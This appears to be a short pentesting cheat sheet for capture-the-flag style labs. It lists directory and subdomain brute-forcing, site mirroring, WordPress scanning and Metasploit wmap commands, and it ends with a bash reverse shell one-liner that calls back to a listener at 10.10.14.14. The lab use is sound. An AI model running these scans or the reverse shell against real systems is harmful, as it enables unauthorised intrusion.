## Directory Discovery

Word lists are at `/usr/share/wordlists` (In KALI)

```
gobuster dir -u URL:port -t threads -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

## Search for subdomains

```
wfuzz -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u URL -v -c -H "Host:FUZZ.NAME.htb" --hw 26
```

Search for PHP files

```
gobuster dir -u http://IP/ -t 80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

Backup: (Can get through things ^^^ can't)

```
dirsearch -u http://ipaddress
```

```
dirb http://IP/
```

-X .sh - extensions to search

-w /path/to/wordlist - wordlist


## Replicate website on local storage

```
wget http://ip/ -r
```
https:
```
wget http://ip/ -r --no-check-certificate
```

## Wordpress vulnerability checker

```
wpscan --url URL
```

--plugin-detection aggressive    -   Takes a long time, but digs up good dirt


## WMAP - Map website tool

Load module in msfconsole
```
load wmap
```

Add target site
```
wmap_sites -a http://IP
```
And
```
wmap_targets -t http://ip-address
```
Execute
```
wmap_run -e
```


## Reverse Shell through encded URL

```
bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1'
```
